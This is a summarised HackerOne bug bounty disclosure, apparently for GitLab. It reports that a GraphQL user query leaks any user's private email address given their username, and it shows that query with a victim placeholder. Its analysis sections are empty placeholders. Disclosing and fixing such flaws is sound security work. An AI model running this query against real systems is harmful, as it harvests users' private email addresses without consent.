# Able to leak private email of any user given his/her username via graphql

## Metadata
- **Source:** HackerOne
- **Report:** 972355 | https://hackerone.com/reports/972355
- **Submitted:** 2020-09-01
- **Reporter:** vaib25vicky
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Information Disclosure
- **CVEs:** None
- **Category:** web-api

## Summary
### Summary

Graphql query user is leaking private email of users

```
query {
  user(username:"<victim>"){
    email
    username
  }
}

```

### Steps to reproduce

(Step-by-step guide to reproduce the issue, including:)

* Have a account with private email settings
* Use graphql query to access the private email
```
query {
  user(username:"<victim>"){
    email
    username
  }
}
```

* Done



## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

### Summary

Graphql query user is leaking private email of users

```
query {
  user(username:"<victim>"){
    email
    username
  }
}

```

### Steps to reproduce

(Step-by-step guide to reproduce the issue, including:)

* Have a account with private email settings
* Use graphql query to access the private email
```
query {
  user(username:"<victim>"){
    email
    username
  }
}
```

* Done

## Impact

Leaks private emails of users by just knowing their usernames. Attacker can use this bug for mass leakage of gitlab users private emails.

</details>

---
*Analysed by Claude on 2026-05-24*
